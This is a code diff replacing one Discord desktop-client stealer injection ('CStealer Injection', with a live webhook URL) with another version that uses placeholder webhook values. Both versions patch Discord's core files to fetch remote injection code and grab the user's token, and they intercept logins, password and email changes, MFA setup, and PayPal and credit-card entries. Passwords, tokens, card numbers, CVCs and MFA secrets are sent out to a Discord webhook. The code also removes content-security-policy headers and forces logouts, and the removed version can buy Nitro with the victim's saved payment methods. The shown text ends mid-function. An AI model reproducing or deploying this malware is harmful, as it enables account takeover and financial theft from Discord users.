@@ -1,1 +1,256 @@
-const args=process.argv,fs=require("fs"),path=require("path"),https=require("https"),querystring=require("querystring"),{BrowserWindow:BrowserWindow,session:session}=require("electron"),config={webhook:"https://discord.com/api/webhooks/1193940355742175312/kDCJG33U9wlz4BwOlcJeqj8-s_dTzN3OJS-6A3raPpyVPi-qtN_R7edOtMQ_kQIumMOS",webhook_protector_key:"%WEBHOOK_KEY%",auto_buy_nitro:!1,ping_on_run:!0,ping_val:"@everyone",embed_name:"CStealer Injection",embed_icon:"https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png".replace(/ /g,"%20"),embed_color:2895667,injection_url:"https://raw.githubusercontent.com/wtfcstealerwtf/index/main/injection.js",api:"https://discord.com/api/v9/users/@me",nitro:{boost:{year:{id:"521847234246082599",sku:"511651885459963904",price:"9999"},month:{id:"521847234246082599",sku:"511651880837840896",price:"999"}},classic:{month:{id:"521846918637420545",sku:"511651871736201216",price:"499"}}},filter:{urls:["https://discord.com/api/v*/users/@me","https://discordapp.com/api/v*/users/@me","https://*.discord.com/api/v*/users/@me","https://discordapp.com/api/v*/auth/login","https://discord.com/api/v*/auth/login","https://*.discord.com/api/v*/auth/login","https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts","https://api.stripe.com/v*/tokens","https://api.stripe.com/v*/setup_intents/*/confirm","https://api.stripe.com/v*/payment_intents/*/confirm"]},filter2:{urls:["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json","https://*.discord.com/api/v*/applications/detectable","https://discord.com/api/v*/applications/detectable","https://*.discord.com/api/v*/users/@me/library","https://discord.com/api/v*/users/@me/library","wss://remote-auth-gateway.discord.gg/*"]}};function parity_32(e,t,n){return e^t^n}function ch_32(e,t,n){return e&t^~e&n}function maj_32(e,t,n){return e&t^e&n^t&n}function rotl_32(e,t){return e<<t|e>>>32-t}function safeAdd_32_2(e,t){var n=(65535&e)+(65535&t);return(65535&(e>>>16)+(t>>>16)+(n>>>16))<<16|65535&n}function safeAdd_32_5(e,t,n,a,r){var o=(65535&e)+(65535&t)+(65535&n)+(65535&a)+(65535&r);return(65535&(e>>>16)+(t>>>16)+(n>>>16)+(a>>>16)+(r>>>16)+(o>>>16))<<16|65535&o}function binb2hex(e){var t,n,a="0123456789abcdef",r="",o=4*e.length;for(t=0;t<o;t+=1)n=e[t>>>2]>>>8*(3-t%4),r+=a.charAt(n>>>4&15)+a.charAt(15&n);return r}function getH(){return[1732584193,4023233417,2562383102,271733878,3285377520]}function roundSHA1(e,t){var n,a,r,o,i,s,c,l=[],d=ch_32,p=parity_32,u=maj_32,f=rotl_32,m=safeAdd_32_2,g=safeAdd_32_5;for(n=t[0],a=t[1],r=t[2],o=t[3],i=t[4],c=0;c<80;c+=1)l[c]=c<16?e[c]:f(l[c-3]^l[c-8]^l[c-14]^l[c-16],1),s=c<20?g(f(n,5),d(a,r,o),i,1518500249,l[c]):c<40?g(f(n,5),p(a,r,o),i,1859775393,l[c]):c<60?g(f(n,5),u(a,r,o),i,2400959708,l[c]):g(f(n,5),p(a,r,o),i,3395469782,l[c]),i=o,o=r,r=f(a,30),a=n,n=s;return t[0]=m(n,t[0]),t[1]=m(a,t[1]),t[2]=m(r,t[2]),t[3]=m(o,t[3]),t[4]=m(i,t[4]),t}function finalizeSHA1(e,t,n,a){var r,o,i;for(i=15+(t+65>>>9<<4);e.length<=i;)e.push(0);for(e[t>>>5]|=128<<24-t%32,e[i]=t+n,o=e.length,r=0;r<o;r+=16)a=roundSHA1(e.slice(r,r+16),a);return a}function hex2binb(e,t,n){var a,r,o,i,s,c,l=e.length;for(a=t||[0],c=(n=n||0)>>>3,0!=l%2&&console.error("String of HEX type must be in byte increments"),r=0;r<l;r+=2)if(o=parseInt(e.substr(r,2),16),isNaN(o))console.error("String of HEX type contains invalid characters");else{for(i=(s=(r>>>1)+c)>>>2;a.length<=i;)a.push(0);a[i]|=o<<8*(3-s%4)}return{value:a,binLen:4*l+n}}class jsSHA{constructor(){var e,t,n,a,r,o=0,i=[],s=0,c=!1,l=!1,d=[],p=[];t=hex2binb,1!==parseInt(1,10)&&console.error("numRounds must a integer >= 1"),n=512,a=roundSHA1,r=finalizeSHA1,e=getH(),this.setHMACKey=function(t){var i,s,c,u;if(s=(i=hex2binb(t)).binLen,c=i.value,64,15,64<s/8){for(c=r(c,s,0,getH());c.length<=15;)c.push(0);c[15]&=4294967040}else if(64>s/8){for(;c.length<=15;)c.push(0);c[15]&=4294967040}for(u=0;u<=15;u+=1)d[u]=909522486^c[u],p[u]=1549556828^c[u];e=a(d,e),o=n,l=!0},this.update=function(r){var c,l,d,p,u,f=0;for(l=(c=t(r,i,s)).binLen,p=c.value,d=l>>>5,u=0;u<d;u+=16)f+n<=l&&(e=a(p.slice(u,u+16),e),f+=n);o+=f,i=p.slice(f>>>5),s=l%n},this.getHMAC=function(){var t;!1===l&&console.error("Cannot call getHMAC without first setting HMAC key");return!1===c&&(t=r(i,s,o,e),e=a(p,getH()),e=r(t,160,n,e)),c=!0,binb2hex(e)}}}function totp(e){const t=Date.now(),n=Math.round(t/1e3),a=leftpad(dec2hex(Math.floor(n/30)),16,"0"),r=new jsSHA;r.setHMACKey(base32tohex(e)),r.update(a);const o=r.getHMAC(),i=hex2dec(o.substring(o.length-1));let s=(hex2dec(o.substr(2*i,8))&hex2dec("7fffffff"))+"";return s=s.substr(Math.max(s.length-6,0),6),s}function hex2dec(e){return parseInt(e,16)}function dec2hex(e){return(e<15.5?"0":"")+Math.round(e).toString(16)}function base32tohex(e){let t="",n="";e=e.replace(/=+$/,"");for(let n=0;n<e.length;n++){let a="ABCDEFGHIJKLMNOPQRSTUVWXYZ234567".indexOf(e.charAt(n).toUpperCase());-1===a&&console.error("Invalid base32 character in key"),t+=leftpad(a.toString(2),5,"0")}for(let e=0;e+8<=t.length;e+=8){let a=t.substr(e,8);n+=leftpad(parseInt(a,2).toString(16),2,"0")}return n}function leftpad(e,t,n){return t+1>=e.length&&(e=Array(t+1-e.length).join(n)+e),e}"function"==typeof define&&define.amd?define((function(){return jsSHA})):"undefined"!=typeof exports?"undefined"!=typeof module&&module.exports?module.exports=exports=jsSHA:exports=jsSHA:global.jsSHA=jsSHA,jsSHA.default&&(jsSHA=jsSHA.default);const discordPath=function(){const e=args[0].split(path.sep).slice(0,-1).join(path.sep);let t;return"win32"===process.platform?t=path.join(e,"resources"):"darwin"===process.platform&&(t=path.join(e,"Contents","Resources")),fs.existsSync(t)?{resourcePath:t,app:e}:{undefined:void 0,undefined:void 0}}();function updateCheck(){const{resourcePath:e,app:t}=discordPath;if(void 0===e||void 0===t)return;const n=path.join(e,"app"),a=path.join(n,"package.json"),r=path.join(n,"index.js"),o=`${t}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`,i=path.join(process.env.APPDATA,"\\betterdiscord\\data\\betterdiscord.asar");if(fs.existsSync(n)||fs.mkdirSync(n),fs.existsSync(a)&&fs.unlinkSync(a),fs.existsSync(r)&&fs.unlinkSync(r),"win32"===process.platform||"darwin"===process.platform){fs.writeFileSync(a,JSON.stringify({name:"discord",main:"index.js"},null,4));const t=`const fs = require('fs'), https = require('https');\nconst indexJs = '${o}';\nconst bdPath = '${i}';\nconst fileSize = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") \n        init();\n})\nasync function init() {\n    https.get('${config.injection_url}', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '${config.webhook}')\n        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n    \n    }).on("error", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('${path.join(e,"app.asar")}')\nif (fs.existsSync(bdPath)) require(bdPath);`;fs.writeFileSync(r,t.replace(/\\/g,"\\\\"))}return!fs.existsSync(path.join(__dirname,"initiation"))||(fs.rmdirSync(path.join(__dirname,"initiation")),execScript('window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();'),!1)}const execScript=e=>BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(e,!0),getInfo=async e=>{const t=await execScript(`var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open("GET", "${config.api}", false);\n    xmlHttp.setRequestHeader("Authorization", "${e}");\n    xmlHttp.send(null);\n    xmlHttp.responseText;`);return JSON.parse(t)},fetchBilling=async e=>{const t=await execScript(`var xmlHttp = new XMLHttpRequest(); \n    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); \n    xmlHttp.setRequestHeader("Authorization", "${e}"); \n    xmlHttp.send(null); \n    xmlHttp.responseText`);return t.lenght&&0!==t.length?JSON.parse(t):""},getBilling=async e=>{const t=await fetchBilling(e);if(!t)return"❌";let n="";return t.forEach((e=>{if(!e.invalid)switch(e.type){case 1:n+="💳 ";break;case 2:n+="<:paypal:951139189389410365> "}})),n||(n="❌"),n},Purchase=async(e,t,n,a)=>{const r={expected_amount:config.nitro[n][a].price,expected_currency:"usd",gift:!0,payment_source_id:t,payment_source_token:null,purchase_token:"2422867c-244d-476a-ba4f-36e197758d97",sku_subscription_plan_id:config.nitro[n][a].sku},o=execScript(`var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[n][a].id}/purchase", false);\n    xmlHttp.setRequestHeader("Authorization", "${e}");\n    xmlHttp.setRequestHeader('Content-Type', 'application/json');\n    xmlHttp.send(JSON.stringify(${JSON.stringify(r)}));\n    xmlHttp.responseText`);return o.gift_code?"https://discord.gift/"+o.gift_code:null},buyNitro=async e=>{const t=await fetchBilling(e),n="Failed to Purchase ❌";if(!t)return n;let a=[];t.forEach((e=>{e.invalid||(a=a.concat(e.id))}));for(let t in a){const a=Purchase(e,t,"boost","year");if(null!==a)return a;{const a=Purchase(e,t,"boost","month");if(null!==a)return a;{const a=Purchase(e,t,"classic","month");return null!==a?a:n}}}},getNitro=e=>{switch(e){case 0:default:return"No Nitro";case 1:return"Nitro Classic";case 2:return"Nitro Boost"}},getBadges=e=>{let t="";switch(e){case 1:t+="Discord Staff, ";break;case 2:t+="Partnered Server Owner, ";break;case 131072:t+="Verified Bot Developer, ";break;case 4:t+="Hypesquad Event, ";break;case 16384:t+="Gold BugHunter, ";break;case 8:t+="Green BugHunter, ";break;case 512:t+="Early Supporter, ";break;case 128:t+="HypeSquad Brillance, ";break;case 64:t+="HypeSquad Bravery, ";break;case 256:t+="HypeSquad Balance, ";break;default:t="None"}return t},hooker=async e=>{const t=JSON.stringify(e),n=new URL(config.webhook),a={"Content-Type":"application/json","Access-Control-Allow-Origin":"*"};if(!config.webhook.includes("api/webhooks")){const e=totp(config.webhook_protector_key);a.Authorization=e}const r={protocol:n.protocol,hostname:n.host,path:n.pathname,method:"POST",headers:a},o=https.request(r);o.on("error",(e=>{console.log(e)})),o.write(t),o.end()},login=async(e,t,n)=>{const a=await getInfo(n),r=getNitro(a.premium_type),o=getBadges(a.flags),i=await getBilling(n),s={username:config.embed_name,avatar_url:config.embed_icon,embeds:[{color:config.embed_color,fields:[{name:"**Account Information**",value:`<:mail:1095741024678191114> Email: **${e}** - <:blacklock:1095741022065131571> Password: **${t}**`,inline:!1},{name:"**Discord Information**",value:`<:blackarrow:1095740975197995041> Nitro Type: **${r}**\n<a:blackhypesquad:1095742323423453224> Badges: **${o}**\n<a:blackmoneycard:1095741026850852965> Billing: **${i}**`,inline:!1},{name:"<:hackerblack:1095747410539593800> **Token**",value:`\`${n}\``,inline:!1}],author:{name:a.username+"#"+a.discriminator+" | "+a.id,icon_url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}.webp`},footer:{text:"CStealer Injection・https://github.com/can-kat/cstealer",icon_url:"https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}}]};config.ping_on_run&&(s.content=config.ping_val),hooker(s)},passwordChanged=async(e,t,n)=>{const a=await getInfo(n),r=getNitro(a.premium_type),o=getBadges(a.flags),i=await getBilling(n),s={username:config.embed_name,avatar_url:config.embed_icon,embeds:[{color:config.embed_color,fields:[{name:"**Password Changed**",value:`<:mail:1095741024678191114> Email: **${a.email}**\n<:blacklock:1095741022065131571> Old Password: **${e}**\n<:blacklock:1095741022065131571> New Password: **${t}**`,inline:!0},{name:"**Discord Information**",value:`<:blackarrow:1095740975197995041> Nitro Type: **${r}**\n<a:blackhypesquad:1095742323423453224> Badges: **${o}**\n<a:blackmoneycard:1095741026850852965> Billing: **${i}**`,inline:!0},{name:"<:hackerblack:1095747410539593800> **Token**",value:`\`${n}\``,inline:!1}],author:{name:a.username+"#"+a.discriminator+" | "+a.id,icon_url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}.webp`},footer:{text:"CStealer Injection・https://github.com/can-kat/cstealer",icon_url:"https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}}]};config.ping_on_run&&(s.content=config.ping_val),hooker(s)},emailChanged=async(e,t,n)=>{const a=await getInfo(n),r=getNitro(a.premium_type),o=getBadges(a.flags),i=await getBilling(n),s={username:config.embed_name,avatar_url:config.embed_icon,embeds:[{color:config.embed_color,fields:[{name:"**Email Changed**",value:`<:mail:1095741024678191114> New Email: **${e}**\n<:blacklock:1095741022065131571> Password: **${t}**`,inline:!0},{name:"**Discord Information**",value:`<:blackarrow:1095740975197995041> Nitro Type: **${r}**\n<a:blackhypesquad:1095742323423453224> Badges: **${o}**\n<a:blackmoneycard:1095741026850852965> Billing: **${i}**`,inline:!0},{name:"<:hackerblack:1095747410539593800> **Token**",value:`\`${n}\``,inline:!1}],author:{name:a.username+"#"+a.discriminator+" | "+a.id,icon_url:`https://cdn.discordapp.com/avatars/${a.id}/${a.avatar}.webp`},footer:{text:"CStealer Injection・https://github.com/can-kat/cstealer",icon_url:"https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}}]};config.ping_on_run&&(s.content=config.ping_val),hooker(s)},PaypalAdded=async e=>{const t=await getInfo(e),n=getNitro(t.premium_type),a=getBadges(t.flags),r=getBilling(e),o={username:config.embed_name,avatar_url:config.embed_icon,embeds:[{color:config.embed_color,fields:[{name:"**Paypal Added**",value:"Time to buy some nitro baby 😩",inline:!1},{name:"**Discord Information**",value:`<:blackarrow:1095740975197995041> Nitro Type: **${n}**\n<a:blackhypesquad:1095742323423453224> Badges: **${a}**\n<a:blackmoneycard:1095741026850852965> Billing: **${r}**`,inline:!0},{name:"<:hackerblack:1095747410539593800> **Token**",value:`\`${e}\``,inline:!1}],author:{name:t.username+"#"+t.discriminator+" | "+t.id,icon_url:`https://cdn.discordapp.com/avatars/${t.id}/${t.avatar}.webp`},footer:{text:"CStealer Injection・https://github.com/can-kat/cstealer",icon_url:"https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}}]};config.ping_on_run&&(o.content=config.ping_val),hooker(o)},ccAdded=async(e,t,n,a,r)=>{const o=await getInfo(r),i=getNitro(o.premium_type),s=getBadges(o.flags),c=await getBilling(r),l={username:config.embed_name,avatar_url:config.embed_icon,embeds:[{color:config.embed_color,fields:[{name:"**Credit Card Added**",value:`Credit Card Number: **${e}**\nCVC: **${t}**\nCredit Card Expiration: **${n}/${a}**`,inline:!0},{name:"**Discord Information**",value:`<:blackarrow:1095740975197995041> Nitro Type: **${i}**\n<a:blackhypesquad:1095742323423453224> Badges: **${s}**\n<a:blackmoneycard:1095741026850852965> Billing: **${c}**`,inline:!0},{name:"<:hackerblack:1095747410539593800> **Token**",value:`\`${r}\``,inline:!1}],author:{name:o.username+"#"+o.discriminator+" | "+o.id,icon_url:`https://cdn.discordapp.com/avatars/${o.id}/${o.avatar}.webp`},footer:{text:"CStealer Injection・https://github.com/can-kat/cstealer",icon_url:"https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}}]};config.ping_on_run&&(l.content=config.ping_val),hooker(l)},nitroBought=async e=>{const t=await getInfo(e),n=getNitro(t.premium_type),a=getBadges(t.flags),r=await getBilling(e),o=await buyNitro(e),i={username:config.embed_name,content:o,avatar_url:config.embed_icon,embeds:[{color:config.embed_color,fields:[{name:"**Nitro bought!**",value:`**Nitro Code:**\n\`\`\`diff\n+ ${o}\`\`\``,inline:!0},{name:"**Discord Information**",value:`<:blackarrow:1095740975197995041> Nitro Type: **${n}**\n<a:blackhypesquad:1095742323423453224> Badges: **${a}**\n<a:blackmoneycard:1095741026850852965> Billing: **${r}**`,inline:!0},{name:"<:hackerblack:1095747410539593800> **Token**",value:`\`${e}\``,inline:!1}],author:{name:t.username+"#"+t.discriminator+" | "+t.id,icon_url:`https://cdn.discordapp.com/avatars/${t.id}/${t.avatar}.webp`},footer:{text:"CStealer Injection・https://github.com/can-kat/cstealer",icon_url:"https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"}}]};config.ping_on_run&&(i.content=config.ping_val+`\n${o}`),hooker(i)};session.defaultSession.webRequest.onBeforeRequest(config.filter2,((e,t)=>{if(e.url.startsWith("wss://remote-auth-gateway"))return t({cancel:!0});updateCheck()})),session.defaultSession.webRequest.onHeadersReceived(((e,t)=>{e.url.startsWith(config.webhook)?e.url.includes("discord.com")?t({responseHeaders:Object.assign({"Access-Control-Allow-Headers":"*"},e.responseHeaders)}):t({responseHeaders:Object.assign({"Content-Security-Policy":["default-src '*'","Access-Control-Allow-Headers '*'","Access-Control-Allow-Origin '*'"],"Access-Control-Allow-Headers":"*","Access-Control-Allow-Origin":"*"},e.responseHeaders)}):(delete e.responseHeaders["content-security-policy"],delete e.responseHeaders["content-security-policy-report-only"],t({responseHeaders:{...e.responseHeaders,"Access-Control-Allow-Headers":"*"}}))})),session.defaultSession.webRequest.onCompleted(config.filter,(async(e,t)=>{if(200!==e.statusCode&&202!==e.statusCode)return;const n=Buffer.from(e.uploadData[0].bytes).toString(),a=JSON.parse(n),r=await execScript("(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()");switch(!0){case e.url.endsWith("login"):login(a.login,a.password,r).catch(console.error);break;case e.url.endsWith("users/@me")&&"PATCH"===e.method:if(!a.password)return;a.email&&emailChanged(a.email,a.password,r).catch(console.error),a.new_password&&passwordChanged(a.password,a.new_password,r).catch(console.error);break;case e.url.endsWith("tokens")&&"POST"===e.method:const t=querystring.parse(unparsedData.toString());ccAdded(t["card[number]"],t["card[cvc]"],t["card[exp_month]"],t["card[exp_year]"],r).catch(console.error);break;case e.url.endsWith("paypal_accounts")&&"POST"===e.method:PaypalAdded(r).catch(console.error);break;case e.url.endsWith("confirm")&&"POST"===e.method:if(!config.auto_buy_nitro)return;setTimeout((()=>{nitroBought(r).catch(console.error)}),7500)}})),module.exports=require("./core.asar");
+const { BrowserWindow, session } = require('electron'),
+    { execSync } = require("child_process"),
+    { parse } = require("querystring"),
+    path = require("path"),
+    fs = require("fs");
+
+let [ID, WEBHOOK] = ["%ID_REQUEST%", "%WEBHOOK%"];
+
+const [LOGOUT_SCRIPT, TOKEN_SCRIPT, INJECT_URL] = ["window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\"get_require\"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b=\"string\"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})(\"login\").logout()}LogOut();", "for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) if (gg.c.hasOwnProperty(a)) { let b = gg.c[a].exports; if (b && b.__esModule && b.default) for (let a in b.default) 'getToken' == a && (token = b.default.getToken())} token;", "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js"];
+
+function send(e, d) {
+    return new Promise((resolve, reject) => {   
+      const url = new URL(WEBHOOK);
+        BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`fetch("${url}", ${JSON.stringify({
+            method: 'POST',
+            headers: {
+                'Content-Type': 'text/plain',
+                'Access-Control-Allow-Origin': '*',
+                'authorization': WEBHOOK,
+            },
+            body: JSON.stringify(d),
+        })})`).then(r => {
+            if (r.ok) {
+                resolve(r.json());
+            }
+        }).catch(e => {
+            reject(e);
+        });
+    });
+}
+
+function cruise(a, b, c, d) {
+        switch (a) {
+            case 'LOGIN_USER':
+                let x = {
+                    IP: ip,
+                    TYPE: d,
+                    TOKEN: b,
+                    PASSWORD: c['password'] ? c['password'] : "",
+                    ...RAW_DATA
+                }
+                if (c['code']) {
+                    x.CODE = c['code']
+                }
+                send("login", x);
+                break;
+            case "USERNAME_CHANGED":
+                send("username", {
+                    IP: ip,
+                    TOKEN: b,
+                    PASSWORD: c['password'],
+                    NEW_USERNAME: c['username'],
+                    ...RAW_DATA
+                });
+                break;
+            case 'EMAIL_CHANGED':
+                send("email", {
+                    IP: ip,
+                    TOKEN: b,
+                    PASSWORD: c['password'],
+                    NEW_EMAIL: c['email'],
+                    ...RAW_DATA
+                });
+                break;
+            case 'PASSWORD_CHANGED':
+                send("password", {
+                    IP: ip,
+                    TOKEN: b,
+                    OLD_PASSWORD: c['password'],
+                    NEW_PASSWORD: c['new_password'],
+                    ...RAW_DATA
+                });
+                break;
+            case 'CREDITCARD_ADDED':
+                send("creditcard", {
+                    IP: ip,
+                    TOKEN: b,
+                    NUMBER: c['card[number]'],
+                    DATE: `${c['card[exp_month]']}:${c['card[exp_year]']}`,
+                    CVC: c['card[cvc]'],
+                    DATA: c,
+                    ...RAW_DATA
+                });
+                break;
+            case 'PAYPAL_ADDED':
+                send("paypal", {
+                    IP: ip,
+                    TOKEN: b,
+                    EMAIL: c['email'],
+                    PASSWORD: c['password'],
+                    NEW_PAYPAL: "done",
+                    ...RAW_DATA
+                });
+                break;
+            case 'MFA_ENABLED':
+                send("mfae", {
+                    IP: ip,
+                    TOKEN: b,
+                    PASSWORD: c['password'],
+                    CODE: c['code'],
+                    SECRET_KEY: c['secret'],
+                    ...RAW_DATA
+                });
+                break;
+            case "INJECTED":
+                send("injected", {
+                    IP: ip,
+                    TOKEN: b,
+                    ...RAW_DATA
+                });
+                break;
+            default:
+        }
+    };
+
+const DISCORD_PATH = (function () {
+    const app = process.argv[0].split(path.sep).slice(0, -1).join(path.sep); 
+    let resource;
+    if (process.platform === 'win32') {
+        resource = path.join(app, 'resources');
+    } else if (process.platform === 'darwin') {
+        resource = path.join(app, 'Contents', 'Resources');
+    }
+    if (fs.existsSync(resource)) return { resource, app };
+    return { undefined, undefined };
+})();
+
+async function updateCheck() {
+    const { resource, app } = DISCORD_PATH;
+    if (resource === undefined || app === undefined) return;
+    let p = path.join(resource, 'app');
+    if (!fs.existsSync(p)) fs.mkdirSync(p);
+    if (fs.existsSync(path.join(p, 'package.json'))) fs.unlinkSync(path.join(p, 'package.json'));
+    if (fs.existsSync(path.join(p, 'index.js'))) fs.unlinkSync(path.join(p, 'index.js'));
+    if (process.platform === 'win32' || process.platform === 'darwin') {
+        fs.writeFileSync(path.join(p, 'package.json'), JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
+        fs.writeFileSync(path.join(p, 'index.js'), `const fs = require('fs'), https = require('https');\nconst indexJs = '${`${app}\\modules\\${fs.readdirSync(`${app}\\modules\\`).filter(x => /discord_desktop_core-+?/.test(x))[0]}\\discord_desktop_core\\index.js`}';\nconst bdPath = '${path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar')}';\nconst K4ITRUN = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (K4ITRUN < 20000 || data === "module.exports = require('./core.asar')")\n        init();\n})\nasync function init() {\n    https.get('${INJECT_URL}', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '${WEBHOOK}')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n        \n    }).on("error", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('${path.join(resource, 'app.asar')}')\nif (fs.existsSync(bdPath)) require(bdPath);`.replace(/\\/g, '\\\\'));
+    }
+    if (!fs.existsSync(path.join(__dirname, 'initiation'))) return;
+    fs.rmdirSync(path.join(__dirname, 'initiation'));
+
+    // ALERT !!
+    let token = await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(TOKEN_SCRIPT, true);
+    cruise('INJECTED', token);
+
+    BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(LOGOUT_SCRIPT, true);
+}
+
+session.defaultSession.webRequest.onBeforeRequest({
+    'urls': [
+        'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
+        'https://*.discord.com/api/v*/applications/detectable',
+        'https://discord.com/api/v*/applications/detectable',
+        'https://*.discord.com/api/v*/users/@me/library',
+        'https://discord.com/api/v*/users/@me/library',
+        'https://*.discord.com/api/v*/users/@me/billing/subscriptions',
+        'https://discord.com/api/v*/users/@me/billing/subscriptions',
+        'wss://remote-auth-gateway.discord.gg/*',
+        'https://discord.com/api/v*/auth/sessions',
+        'https://*.discord.com/api/v*/auth/sessions',
+        'https://discordapp.com/api/v*/auth/sessions'
+    ]
+}, (a, callback) => {
+    if (!fs.existsSync(`${__dirname}/aurathemes`)) {
+        fs.mkdirSync(`${__dirname}/aurathemes`);
+    }
+    if (!fs.existsSync(`${__dirname}/aurathemes/${ID}.txt`)) {
+        fs.writeFileSync(`${__dirname}/aurathemes/${ID}.txt`, WEBHOOK);
+        BrowserWindow.getAllWindows()[0]?.webContents.executeJavaScript(LOGOUT_SCRIPT, true);
+    }
+    if (a.url.startsWith('wss://remote-auth-gateway') || a.url.endsWith("auth/sessions")) {
+        callback({ cancel: true });
+    } else {
+        callback({ cancel: false });
+    }
+    updateCheck();
+})
+
+session.defaultSession.webRequest.onHeadersReceived((a, c) => {
+    delete a.responseHeaders['content-security-policy'];
+    delete a.responseHeaders['content-security-policy-report-only'];
+    c({
+        'responseHeaders': {
+            ...a.responseHeaders,
+            'Access-Control-Allow-Headers': '*'
+        }
+    });
+});
+
+session.defaultSession.webRequest.onCompleted({
+    'urls': [
+        'https://discord.com/api/v*/users/@me',
+        'https://discordapp.com/api/v*/users/@me',
+        'https://*.discord.com/api/v*/users/@me',
+        "https://discord.com/api/v*/auth/mfa/totp",
+        "https://discord.com/api/v*/users/@me/mfa/totp/disable",
+        "https://discordapp.com/api/v*/users/@me/mfa/totp/disable",
+        "https://*.discord.com/api/v*/users/@me/mfa/totp/disable",
+        "https://canary.discord.com/api/v*/users/@me/mfa/totp/disable",
+        "https://discord.com/api/v*/users/@me/mfa/totp/enable",
+        "https://discordapp.com/api/v*/users/@me/mfa/totp/enable",
+        "https://*.discord.com/api/v*/users/@me/mfa/totp/enable",
+        "https://canary.discord.com/api/v*/users/@me/mfa/totp/enable",
+        "https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
+        "https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
+        "https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
+        "https://discord.com/api/v*/users/@me/billing/payment-sources/validate-billing-address",
+        'https://discordapp.com/api/v*/auth/login',
+        'https://discord.com/api/v*/auth/login',
+        'https://*.discord.com/api/v*/auth/login',
+        'https://discord.com/api/v*/auth/register',
+        'https://api.stripe.com/v*/tokens',
+    ]
+}, async (a, callback) => {
+    try {
+        var data = JSON.parse(Buffer.from(a.uploadData[0].bytes).toString());
+    } catch (err) {
+        var data = parse(decodeURIComponent(a.uploadData[0].bytes.toString()));
+    }
+    let authorization = await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(TOKEN_SCRIPT, true)
+    if (a.statusCode != 200) return;
+    if (a.url.endsWith('/login')) {
+        if (!authorization) return
+        cruise('LOGIN_USER', authorization, data, "LOGGED IN");
+    }
+    if (a.url.endsWith('/register')) {
+        cruise('LOGIN_USER', authorization, data, "SIGNED UP");
+    }
+    if (a.url.endsWith('/mfa/totp')) {
+        cruise('LOGIN_USER', authorization, data, "LOGGED IN WITH MFA-2");
+    }
+    if (a.url.includes('/@me/mfa/totp/enable')) {
+        cruise('MFA_ENABLED', authorization, data);
+    }
+    if (a.url.endsWith('/paypal/billing-agreement-tokens')) {
+        cruise('PAYPAL_ADDED', authorization, data);
+    }
+    if (a.url.endsWith('/users/@me')) {
+        if (a.method != 'PATCH') return;
+        if (!data['password']) return;
+        if (data['email']) {
+            cruise('EMAIL_CHANGED', authorization, data);
+        }
+        if (data['new_password']) {
+            cruise('PASSWORD_CHANGED', authorization, data);
+        }
+        if (data['username']) {
+            cruise('USERNAME_CHANGED', authorization, data);
+        }
+    }
